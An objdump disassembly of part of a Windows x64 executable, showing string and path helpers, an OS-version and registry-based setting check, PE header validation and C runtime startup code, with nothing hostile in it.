   140007ba4:	cc                   	int3
   140007ba5:	cc                   	int3
   140007ba6:	cc                   	int3
   140007ba7:	cc                   	int3
   140007ba8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007bad:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140007bb2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007bb7:	57                   	push   %rdi
   140007bb8:	48 83 ec 20          	sub    $0x20,%rsp
   140007bbc:	49 8b f8             	mov    %r8,%rdi
   140007bbf:	8b ea                	mov    %edx,%ebp
   140007bc1:	49 83 c8 ff          	or     $0xffffffffffffffff,%r8
   140007bc5:	48 8b f1             	mov    %rcx,%rsi
   140007bc8:	49 ff c0             	inc    %r8
   140007bcb:	42 80 3c 01 00       	cmpb   $0x0,(%rcx,%r8,1)
   140007bd0:	75 f6                	jne    0x140007bc8
   140007bd2:	41 8d 40 01          	lea    0x1(%r8),%eax
   140007bd6:	3b c5                	cmp    %ebp,%eax
   140007bd8:	72 07                	jb     0x140007be1
   140007bda:	b8 7a 00 07 80       	mov    $0x8007007a,%eax
   140007bdf:	eb 40                	jmp    0x140007c21
   140007be1:	41 8b d8             	mov    %r8d,%ebx
   140007be4:	48 03 de             	add    %rsi,%rbx
   140007be7:	48 3b de             	cmp    %rsi,%rbx
   140007bea:	76 1a                	jbe    0x140007c06
   140007bec:	48 8b d3             	mov    %rbx,%rdx
   140007bef:	48 ff 15 42 19 00 00 	rex.W call *0x1942(%rip)        # 0x140009538
   140007bf6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007bfb:	80 38 5c             	cmpb   $0x5c,(%rax)
   140007bfe:	74 06                	je     0x140007c06
   140007c00:	c6 03 5c             	movb   $0x5c,(%rbx)
   140007c03:	48 ff c3             	inc    %rbx
   140007c06:	c6 03 00             	movb   $0x0,(%rbx)
   140007c09:	eb 03                	jmp    0x140007c0e
   140007c0b:	48 ff c7             	inc    %rdi
   140007c0e:	80 3f 20             	cmpb   $0x20,(%rdi)
   140007c11:	74 f8                	je     0x140007c0b
   140007c13:	48 8b d5             	mov    %rbp,%rdx
   140007c16:	4c 8b c7             	mov    %rdi,%r8
   140007c19:	48 8b ce             	mov    %rsi,%rcx
   140007c1c:	e8 63 94 ff ff       	call   0x140001084
   140007c21:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007c26:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140007c2b:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140007c30:	48 83 c4 20          	add    $0x20,%rsp
   140007c34:	5f                   	pop    %rdi
   140007c35:	c3                   	ret
   140007c36:	cc                   	int3
   140007c37:	cc                   	int3
   140007c38:	cc                   	int3
   140007c39:	cc                   	int3
   140007c3a:	cc                   	int3
   140007c3b:	cc                   	int3
   140007c3c:	cc                   	int3
   140007c3d:	cc                   	int3
   140007c3e:	cc                   	int3
   140007c3f:	cc                   	int3
   140007c40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007c45:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007c4a:	57                   	push   %rdi
   140007c4b:	48 83 ec 20          	sub    $0x20,%rsp
   140007c4f:	33 f6                	xor    %esi,%esi
   140007c51:	48 8b f9             	mov    %rcx,%rdi
   140007c54:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140007c58:	48 ff c2             	inc    %rdx
   140007c5b:	40 38 34 11          	cmp    %sil,(%rcx,%rdx,1)
   140007c5f:	75 f7                	jne    0x140007c58
   140007c61:	48 03 d7             	add    %rdi,%rdx
   140007c64:	48 ff 15 cd 18 00 00 	rex.W call *0x18cd(%rip)        # 0x140009538
   140007c6b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007c70:	48 8b d0             	mov    %rax,%rdx
   140007c73:	eb 08                	jmp    0x140007c7d
   140007c75:	80 3b 5c             	cmpb   $0x5c,(%rbx)
   140007c78:	74 1f                	je     0x140007c99
   140007c7a:	48 8b d3             	mov    %rbx,%rdx
   140007c7d:	48 8b cf             	mov    %rdi,%rcx
   140007c80:	48 ff 15 b1 18 00 00 	rex.W call *0x18b1(%rip)        # 0x140009538
   140007c87:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007c8c:	48 8b d8             	mov    %rax,%rbx
   140007c8f:	48 3b c7             	cmp    %rdi,%rax
   140007c92:	77 e1                	ja     0x140007c75
   140007c94:	80 38 5c             	cmpb   $0x5c,(%rax)
   140007c97:	75 36                	jne    0x140007ccf
   140007c99:	48 3b df             	cmp    %rdi,%rbx
   140007c9c:	74 17                	je     0x140007cb5
   140007c9e:	48 8b d3             	mov    %rbx,%rdx
   140007ca1:	48 8b cf             	mov    %rdi,%rcx
   140007ca4:	48 ff 15 8d 18 00 00 	rex.W call *0x188d(%rip)        # 0x140009538
   140007cab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007cb0:	80 38 3a             	cmpb   $0x3a,(%rax)
   140007cb3:	75 12                	jne    0x140007cc7
   140007cb5:	48 8b cb             	mov    %rbx,%rcx
   140007cb8:	48 ff 15 69 18 00 00 	rex.W call *0x1869(%rip)        # 0x140009528
   140007cbf:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007cc4:	48 8b d8             	mov    %rax,%rbx
   140007cc7:	40 88 33             	mov    %sil,(%rbx)
   140007cca:	be 01 00 00 00       	mov    $0x1,%esi
   140007ccf:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007cd4:	8b c6                	mov    %esi,%eax
   140007cd6:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007cdb:	48 83 c4 20          	add    $0x20,%rsp
   140007cdf:	5f                   	pop    %rdi
   140007ce0:	c3                   	ret
   140007ce1:	cc                   	int3
   140007ce2:	cc                   	int3
   140007ce3:	cc                   	int3
   140007ce4:	cc                   	int3
   140007ce5:	cc                   	int3
   140007ce6:	cc                   	int3
   140007ce7:	cc                   	int3
   140007ce8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007ced:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007cf2:	57                   	push   %rdi
   140007cf3:	48 83 ec 20          	sub    $0x20,%rsp
   140007cf7:	80 39 00             	cmpb   $0x0,(%rcx)
   140007cfa:	0f b7 f2             	movzwl %dx,%esi
   140007cfd:	48 8b d9             	mov    %rcx,%rbx
   140007d00:	74 4a                	je     0x140007d4c
   140007d02:	0f b7 3b             	movzwl (%rbx),%edi
   140007d05:	40 3a fe             	cmp    %sil,%dil
   140007d08:	75 1d                	jne    0x140007d27
   140007d0a:	40 8a cf             	mov    %dil,%cl
   140007d0d:	48 ff 15 34 15 00 00 	rex.W call *0x1534(%rip)        # 0x140009248
   140007d14:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007d19:	85 c0                	test   %eax,%eax
   140007d1b:	74 2a                	je     0x140007d47
   140007d1d:	33 c0                	xor    %eax,%eax
   140007d1f:	66 3b fe             	cmp    %si,%di
   140007d22:	0f 95 c0             	setne  %al
   140007d25:	eb 05                	jmp    0x140007d2c
   140007d27:	b8 01 00 00 00       	mov    $0x1,%eax
   140007d2c:	85 c0                	test   %eax,%eax
   140007d2e:	74 17                	je     0x140007d47
   140007d30:	48 8b cb             	mov    %rbx,%rcx
   140007d33:	48 ff 15 ee 17 00 00 	rex.W call *0x17ee(%rip)        # 0x140009528
   140007d3a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007d3f:	48 8b d8             	mov    %rax,%rbx
   140007d42:	80 38 00             	cmpb   $0x0,(%rax)
   140007d45:	eb b9                	jmp    0x140007d00
   140007d47:	48 8b c3             	mov    %rbx,%rax
   140007d4a:	eb 02                	jmp    0x140007d4e
   140007d4c:	33 c0                	xor    %eax,%eax
   140007d4e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007d53:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007d58:	48 83 c4 20          	add    $0x20,%rsp
   140007d5c:	5f                   	pop    %rdi
   140007d5d:	c3                   	ret
   140007d5e:	cc                   	int3
   140007d5f:	cc                   	int3
   140007d60:	cc                   	int3
   140007d61:	cc                   	int3
   140007d62:	cc                   	int3
   140007d63:	cc                   	int3
   140007d64:	cc                   	int3
   140007d65:	cc                   	int3
   140007d66:	cc                   	int3
   140007d67:	cc                   	int3
   140007d68:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007d6d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140007d72:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007d77:	57                   	push   %rdi
   140007d78:	48 83 ec 20          	sub    $0x20,%rsp
   140007d7c:	33 db                	xor    %ebx,%ebx
   140007d7e:	0f b7 ea             	movzwl %dx,%ebp
   140007d81:	48 8b f9             	mov    %rcx,%rdi
   140007d84:	38 19                	cmp    %bl,(%rcx)
   140007d86:	74 51                	je     0x140007dd9
   140007d88:	0f b7 37             	movzwl (%rdi),%esi
   140007d8b:	40 3a f5             	cmp    %bpl,%sil
   140007d8e:	75 21                	jne    0x140007db1
   140007d90:	40 8a ce             	mov    %sil,%cl
   140007d93:	48 ff 15 ae 14 00 00 	rex.W call *0x14ae(%rip)        # 0x140009248
   140007d9a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007d9f:	85 c0                	test   %eax,%eax
   140007da1:	74 0a                	je     0x140007dad
   140007da3:	33 c0                	xor    %eax,%eax
   140007da5:	66 3b f5             	cmp    %bp,%si
   140007da8:	0f 95 c0             	setne  %al
   140007dab:	eb 09                	jmp    0x140007db6
   140007dad:	33 c0                	xor    %eax,%eax
   140007daf:	eb 05                	jmp    0x140007db6
   140007db1:	b8 01 00 00 00       	mov    $0x1,%eax
   140007db6:	85 c0                	test   %eax,%eax
   140007db8:	48 8b cf             	mov    %rdi,%rcx
   140007dbb:	48 0f 45 cb          	cmovne %rbx,%rcx
   140007dbf:	48 8b d9             	mov    %rcx,%rbx
   140007dc2:	48 8b cf             	mov    %rdi,%rcx
   140007dc5:	48 ff 15 5c 17 00 00 	rex.W call *0x175c(%rip)        # 0x140009528
   140007dcc:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007dd1:	48 8b f8             	mov    %rax,%rdi
   140007dd4:	80 38 00             	cmpb   $0x0,(%rax)
   140007dd7:	75 af                	jne    0x140007d88
   140007dd9:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140007dde:	48 8b c3             	mov    %rbx,%rax
   140007de1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007de6:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140007deb:	48 83 c4 20          	add    $0x20,%rsp
   140007def:	5f                   	pop    %rdi
   140007df0:	c3                   	ret
   140007df1:	cc                   	int3
   140007df2:	cc                   	int3
   140007df3:	cc                   	int3
   140007df4:	cc                   	int3
   140007df5:	cc                   	int3
   140007df6:	cc                   	int3
   140007df7:	cc                   	int3
   140007df8:	cc                   	int3
   140007df9:	cc                   	int3
   140007dfa:	cc                   	int3
   140007dfb:	cc                   	int3
   140007dfc:	cc                   	int3
   140007dfd:	cc                   	int3
   140007dfe:	cc                   	int3
   140007dff:	cc                   	int3
   140007e00:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   140007e05:	b8 01 00 00 00       	mov    $0x1,%eax
   140007e0a:	49 3b 50 08          	cmp    0x8(%r8),%rdx
   140007e0e:	75 1c                	jne    0x140007e2c
   140007e10:	41 0f b7 c9          	movzwl %r9w,%ecx
   140007e14:	ba ff 03 00 00       	mov    $0x3ff,%edx
   140007e19:	66 23 ca             	and    %dx,%cx
   140007e1c:	66 41 39 08          	cmp    %cx,(%r8)
   140007e20:	75 0a                	jne    0x140007e2c
   140007e22:	41 89 40 04          	mov    %eax,0x4(%r8)
   140007e26:	33 c0                	xor    %eax,%eax
   140007e28:	66 45 89 08          	mov    %r9w,(%r8)
   140007e2c:	c3                   	ret
   140007e2d:	cc                   	int3
   140007e2e:	cc                   	int3
   140007e2f:	cc                   	int3
   140007e30:	cc                   	int3
   140007e31:	cc                   	int3
   140007e32:	cc                   	int3
   140007e33:	cc                   	int3
   140007e34:	48 8b c4             	mov    %rsp,%rax
   140007e37:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140007e3b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140007e3f:	57                   	push   %rdi
   140007e40:	48 83 ec 40          	sub    $0x40,%rsp
   140007e44:	8b 1d be 43 00 00    	mov    0x43be(%rip),%ebx        # 0x14000c208
   140007e4a:	48 8b 3d 1f 60 00 00 	mov    0x601f(%rip),%rdi        # 0x14000de70
   140007e51:	83 fb fe             	cmp    $0xfffffffe,%ebx
   140007e54:	0f 85 91 00 00 00    	jne    0x140007eeb
   140007e5a:	83 60 ec 00          	andl   $0x0,-0x14(%rax)
   140007e5e:	48 8d 40 e8          	lea    -0x18(%rax),%rax
   140007e62:	83 25 9f 43 00 00 00 	andl   $0x0,0x439f(%rip)        # 0x14000c208
   140007e69:	4c 8d 0d 90 ff ff ff 	lea    -0x70(%rip),%r9        # 0x140007e00
   140007e70:	bb 01 00 00 00       	mov    $0x1,%ebx
   140007e75:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007e7a:	66 89 18             	mov    %bx,(%rax)
   140007e7d:	44 8b c3             	mov    %ebx,%r8d
   140007e80:	48 8b cf             	mov    %rdi,%rcx
   140007e83:	8d 6b 0f             	lea    0xf(%rbx),%ebp
   140007e86:	48 89 68 08          	mov    %rbp,0x8(%rax)
   140007e8a:	8b d5                	mov    %ebp,%edx
   140007e8c:	48 ff 15 d5 15 00 00 	rex.W call *0x15d5(%rip)        # 0x140009468
   140007e93:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007e98:	83 7c 24 34 00       	cmpl   $0x0,0x34(%rsp)
   140007e9d:	75 46                	jne    0x140007ee5
   140007e9f:	83 64 24 34 00       	andl   $0x0,0x34(%rsp)
   140007ea4:	8d 43 0c             	lea    0xc(%rbx),%eax
   140007ea7:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   140007eac:	4c 8d 0d 4d ff ff ff 	lea    -0xb3(%rip),%r9        # 0x140007e00
   140007eb3:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140007eb8:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   140007ebd:	44 8b c3             	mov    %ebx,%r8d
   140007ec0:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007ec5:	8b d5                	mov    %ebp,%edx
   140007ec7:	48 8b cf             	mov    %rdi,%rcx
   140007eca:	48 ff 15 97 15 00 00 	rex.W call *0x1597(%rip)        # 0x140009468
   140007ed1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007ed6:	83 7c 24 34 00       	cmpl   $0x0,0x34(%rsp)
   140007edb:	75 08                	jne    0x140007ee5
   140007edd:	8b 1d 25 43 00 00    	mov    0x4325(%rip),%ebx        # 0x14000c208
   140007ee3:	eb 06                	jmp    0x140007eeb
   140007ee5:	89 1d 1d 43 00 00    	mov    %ebx,0x431d(%rip)        # 0x14000c208
   140007eeb:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140007ef0:	8b c3                	mov    %ebx,%eax
   140007ef2:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140007ef7:	48 83 c4 40          	add    $0x40,%rsp
   140007efb:	5f                   	pop    %rdi
   140007efc:	c3                   	ret
   140007efd:	cc                   	int3
   140007efe:	cc                   	int3
   140007eff:	cc                   	int3
   140007f00:	cc                   	int3
   140007f01:	cc                   	int3
   140007f02:	cc                   	int3
   140007f03:	cc                   	int3
   140007f04:	48 8b c4             	mov    %rsp,%rax
   140007f07:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140007f0b:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140007f0f:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140007f13:	55                   	push   %rbp
   140007f14:	48 8d 68 e8          	lea    -0x18(%rax),%rbp
   140007f18:	48 81 ec 10 01 00 00 	sub    $0x110,%rsp
   140007f1f:	48 8b 05 e2 40 00 00 	mov    0x40e2(%rip),%rax        # 0x14000c008
   140007f26:	48 33 c4             	xor    %rsp,%rax
   140007f29:	48 89 45 00          	mov    %rax,0x0(%rbp)
   140007f2d:	8b 35 d9 42 00 00    	mov    0x42d9(%rip),%esi        # 0x14000c20c
   140007f33:	c7 44 24 30 0c 00 00 	movl   $0xc,0x30(%rsp)
   140007f3a:	00 
   140007f3b:	83 fe fe             	cmp    $0xfffffffe,%esi
   140007f3e:	0f 85 58 01 00 00    	jne    0x14000809c
   140007f44:	33 ff                	xor    %edi,%edi
   140007f46:	c7 44 24 50 94 00 00 	movl   $0x94,0x50(%rsp)
   140007f4d:	00 
   140007f4e:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140007f53:	89 3d b3 42 00 00    	mov    %edi,0x42b3(%rip)        # 0x14000c20c
   140007f59:	48 ff 15 f0 13 00 00 	rex.W call *0x13f0(%rip)        # 0x140009350
   140007f60:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007f65:	85 c0                	test   %eax,%eax
   140007f67:	0f 84 29 01 00 00    	je     0x140008096
   140007f6d:	8d 77 01             	lea    0x1(%rdi),%esi
   140007f70:	39 74 24 60          	cmp    %esi,0x60(%rsp)
   140007f74:	0f 85 1c 01 00 00    	jne    0x140008096
   140007f7a:	83 7c 24 54 04       	cmpl   $0x4,0x54(%rsp)
   140007f7f:	0f 85 11 01 00 00    	jne    0x140008096
   140007f85:	83 7c 24 58 0a       	cmpl   $0xa,0x58(%rsp)
   140007f8a:	0f 83 06 01 00 00    	jae    0x140008096
   140007f90:	8d 4f 4a             	lea    0x4a(%rdi),%ecx
   140007f93:	48 ff 15 26 15 00 00 	rex.W call *0x1526(%rip)        # 0x1400094c0
   140007f9a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007f9f:	85 c0                	test   %eax,%eax
   140007fa1:	0f 84 ef 00 00 00    	je     0x140008096
   140007fa7:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140007fac:	41 b9 19 00 02 00    	mov    $0x20019,%r9d
   140007fb2:	45 33 c0             	xor    %r8d,%r8d
   140007fb5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007fba:	48 8d 15 1f 1a 00 00 	lea    0x1a1f(%rip),%rdx        # 0x1400099e0
   140007fc1:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   140007fc8:	48 ff 15 69 11 00 00 	rex.W call *0x1169(%rip)        # 0x140009138
   140007fcf:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007fd4:	85 c0                	test   %eax,%eax
   140007fd6:	0f 85 ba 00 00 00    	jne    0x140008096
   140007fdc:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140007fe1:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140007fe6:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140007feb:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140007ff0:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   140007ff4:	45 33 c0             	xor    %r8d,%r8d
   140007ff7:	48 8d 15 02 17 00 00 	lea    0x1702(%rip),%rdx        # 0x140009700
   140007ffe:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008003:	48 ff 15 6e 11 00 00 	rex.W call *0x116e(%rip)        # 0x140009178
   14000800a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000800f:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140008014:	8b d8                	mov    %eax,%ebx
   140008016:	48 ff 15 6b 11 00 00 	rex.W call *0x116b(%rip)        # 0x140009188
   14000801d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008022:	85 db                	test   %ebx,%ebx
   140008024:	75 70                	jne    0x140008096
   140008026:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000802a:	8a 01                	mov    (%rcx),%al
   14000802c:	2c 30                	sub    $0x30,%al
   14000802e:	3c 09                	cmp    $0x9,%al
   140008030:	77 0d                	ja     0x14000803f
   140008032:	0f be 01             	movsbl (%rcx),%eax
   140008035:	83 c7 fd             	add    $0xfffffffd,%edi
   140008038:	c1 e7 04             	shl    $0x4,%edi
   14000803b:	03 f8                	add    %eax,%edi
   14000803d:	eb 26                	jmp    0x140008065
   14000803f:	8a 01                	mov    (%rcx),%al
   140008041:	2c 20                	sub    $0x20,%al
   140008043:	80 39 61             	cmpb   $0x61,(%rcx)
   140008046:	0f b6 d0             	movzbl %al,%edx
   140008049:	0f b6 01             	movzbl (%rcx),%eax
   14000804c:	0f 4c d0             	cmovl  %eax,%edx
   14000804f:	44 0f be c2          	movsbl %dl,%r8d
   140008053:	41 8d 40 bf          	lea    -0x41(%r8),%eax
   140008057:	83 f8 05             	cmp    $0x5,%eax
   14000805a:	77 1a                	ja     0x140008076
   14000805c:	c1 e7 04             	shl    $0x4,%edi
   14000805f:	83 c7 c9             	add    $0xffffffc9,%edi
   140008062:	41 03 f8             	add    %r8d,%edi
   140008065:	48 ff 15 bc 14 00 00 	rex.W call *0x14bc(%rip)        # 0x140009528
   14000806c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008071:	48 8b c8             	mov    %rax,%rcx
   140008074:	eb b4                	jmp    0x14000802a
   140008076:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   14000807a:	48 3b c8             	cmp    %rax,%rcx
   14000807d:	74 17                	je     0x140008096
   14000807f:	81 e7 ff 03 00 00    	and    $0x3ff,%edi
   140008085:	3b fe                	cmp    %esi,%edi
   140008087:	74 05                	je     0x14000808e
   140008089:	83 ff 0d             	cmp    $0xd,%edi
   14000808c:	75 08                	jne    0x140008096
   14000808e:	89 35 78 41 00 00    	mov    %esi,0x4178(%rip)        # 0x14000c20c
   140008094:	eb 06                	jmp    0x14000809c
   140008096:	8b 35 70 41 00 00    	mov    0x4170(%rip),%esi        # 0x14000c20c
   14000809c:	8b c6                	mov    %esi,%eax
   14000809e:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
   1400080a2:	48 33 cc             	xor    %rsp,%rcx
   1400080a5:	e8 c6 03 00 00       	call   0x140008470
   1400080aa:	4c 8d 9c 24 10 01 00 	lea    0x110(%rsp),%r11
   1400080b1:	00 
   1400080b2:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   1400080b6:	49 8b 73 18          	mov    0x18(%r11),%rsi
   1400080ba:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   1400080be:	49 8b e3             	mov    %r11,%rsp
   1400080c1:	5d                   	pop    %rbp
   1400080c2:	c3                   	ret
   1400080c3:	cc                   	int3
   1400080c4:	cc                   	int3
   1400080c5:	cc                   	int3
   1400080c6:	cc                   	int3
   1400080c7:	cc                   	int3
   1400080c8:	cc                   	int3
   1400080c9:	cc                   	int3
   1400080ca:	cc                   	int3
   1400080cb:	cc                   	int3
   1400080cc:	cc                   	int3
   1400080cd:	cc                   	int3
   1400080ce:	cc                   	int3
   1400080cf:	cc                   	int3
   1400080d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400080d4:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   1400080d9:	66 39 05 20 7f ff ff 	cmp    %ax,-0x80e0(%rip)        # 0x140000000
   1400080e0:	74 04                	je     0x1400080e6
   1400080e2:	33 c0                	xor    %eax,%eax
   1400080e4:	eb 53                	jmp    0x140008139
   1400080e6:	48 63 0d 4f 7f ff ff 	movslq -0x80b1(%rip),%rcx        # 0x14000003c
   1400080ed:	48 8d 05 0c 7f ff ff 	lea    -0x80f4(%rip),%rax        # 0x140000000
   1400080f4:	48 03 c8             	add    %rax,%rcx
   1400080f7:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1400080fd:	75 e3                	jne    0x1400080e2
   1400080ff:	b8 0b 01 00 00       	mov    $0x10b,%eax
   140008104:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140008108:	74 1e                	je     0x140008128
   14000810a:	b8 0b 02 00 00       	mov    $0x20b,%eax
   14000810f:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140008113:	75 cd                	jne    0x1400080e2
   140008115:	33 c0                	xor    %eax,%eax
   140008117:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   14000811e:	76 19                	jbe    0x140008139
   140008120:	39 81 f8 00 00 00    	cmp    %eax,0xf8(%rcx)
   140008126:	eb 0e                	jmp    0x140008136
   140008128:	33 c0                	xor    %eax,%eax
   14000812a:	83 79 74 0e          	cmpl   $0xe,0x74(%rcx)
   14000812e:	76 09                	jbe    0x140008139
   140008130:	39 81 e8 00 00 00    	cmp    %eax,0xe8(%rcx)
   140008136:	0f 95 c0             	setne  %al
   140008139:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000813e:	89 05 fc 40 00 00    	mov    %eax,0x40fc(%rip)        # 0x14000c240
   140008144:	e8 cf 06 00 00       	call   0x140008818
   140008149:	8b c8                	mov    %eax,%ecx
   14000814b:	ff 15 af 14 00 00    	call   *0x14af(%rip)        # 0x140009600
   140008151:	48 8b 0d 60 14 00 00 	mov    0x1460(%rip),%rcx        # 0x1400095b8
   140008158:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000815c:	48 89 05 05 4a 00 00 	mov    %rax,0x4a05(%rip)        # 0x14000cb68
   140008163:	48 89 05 06 4a 00 00 	mov    %rax,0x4a06(%rip)        # 0x14000cb70
   14000816a:	8b 05 5c 46 00 00    	mov    0x465c(%rip),%eax        # 0x14000c7cc
   140008170:	89 01                	mov    %eax,(%rcx)
   140008172:	48 8b 0d 37 14 00 00 	mov    0x1437(%rip),%rcx        # 0x1400095b0
   140008179:	8b 05 41 46 00 00    	mov    0x4641(%rip),%eax        # 0x14000c7c0
   14000817f:	89 01                	mov    %eax,(%rcx)
   140008181:	e8 ea 06 00 00       	call   0x140008870
   140008186:	83 3d 73 3e 00 00 00 	cmpl   $0x0,0x3e73(%rip)        # 0x14000c000
   14000818d:	75 0d                	jne    0x14000819c
   14000818f:	48 8d 0d da 06 00 00 	lea    0x6da(%rip),%rcx        # 0x140008870
   140008196:	ff 15 3c 14 00 00    	call   *0x143c(%rip)        # 0x1400095d8
   14000819c:	33 c0                	xor    %eax,%eax
   14000819e:	48 83 c4 28          	add    $0x28,%rsp
   1400081a2:	c3                   	ret
   1400081a3:	cc                   	int3
   1400081a4:	cc                   	int3
   1400081a5:	cc                   	int3
   1400081a6:	cc                   	int3
   1400081a7:	cc                   	int3
   1400081a8:	cc                   	int3
   1400081a9:	cc                   	int3
   1400081aa:	cc                   	int3
   1400081ab:	cc                   	int3
   1400081ac:	cc                   	int3
   1400081ad:	cc                   	int3
   1400081ae:	cc                   	int3
   1400081af:	cc                   	int3
   1400081b0:	48 83 ec 38          	sub    $0x38,%rsp
   1400081b4:	8b 05 0e 46 00 00    	mov    0x460e(%rip),%eax        # 0x14000c7c8
   1400081ba:	4c 8d 05 77 40 00 00 	lea    0x4077(%rip),%r8        # 0x14000c238
   1400081c1:	44 8b 0d fc 45 00 00 	mov    0x45fc(%rip),%r9d        # 0x14000c7c4
   1400081c8:	48 8d 15 61 40 00 00 	lea    0x4061(%rip),%rdx        # 0x14000c230
   1400081cf:	89 05 6f 40 00 00    	mov    %eax,0x406f(%rip)        # 0x14000c244
   1400081d5:	48 8d 0d 4c 40 00 00 	lea    0x404c(%rip),%rcx        # 0x14000c228
   1400081dc:	48 8d 05 61 40 00 00 	lea    0x4061(%rip),%rax        # 0x14000c244
   1400081e3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400081e8:	ff 15 1a 14 00 00    	call   *0x141a(%rip)        # 0x140009608
   1400081ee:	89 05 38 40 00 00    	mov    %eax,0x4038(%rip)        # 0x14000c22c
   1400081f4:	48 83 c4 38          	add    $0x38,%rsp
   1400081f8:	c3                   	ret
   1400081f9:	cc                   	int3
   1400081fa:	cc                   	int3
   1400081fb:	cc                   	int3
   1400081fc:	cc                   	int3
   1400081fd:	cc                   	int3
   1400081fe:	cc                   	int3
   1400081ff:	cc                   	int3
   140008200:	48 83 ec 28          	sub    $0x28,%rsp
   140008204:	e8 5b 07 00 00       	call   0x140008964
   140008209:	48 83 c4 28          	add    $0x28,%rsp
   14000820d:	e9 06 00 00 00       	jmp    0x140008218
   140008212:	cc                   	int3
   140008213:	cc                   	int3
   140008214:	cc                   	int3
   140008215:	cc                   	int3
   140008216:	cc                   	int3
   140008217:	cc                   	int3
   140008218:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000821d:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   140008222:	41 56                	push   %r14
   140008224:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   14000822b:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   140008230:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140008235:	ff 15 cd 11 00 00    	call   *0x11cd(%rip)        # 0x140009408
   14000823b:	90                   	nop
   14000823c:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140008243:	00 00 
   140008245:	48 8b 58 08          	mov    0x8(%rax),%rbx
   140008249:	33 ff                	xor    %edi,%edi
   14000824b:	33 c0                	xor    %eax,%eax
   14000824d:	f0 48 0f b1 1d 22 49 	lock cmpxchg %rbx,0x4922(%rip)        # 0x14000cb78
   140008254:	00 00 
   140008256:	74 0a                	je     0x140008262
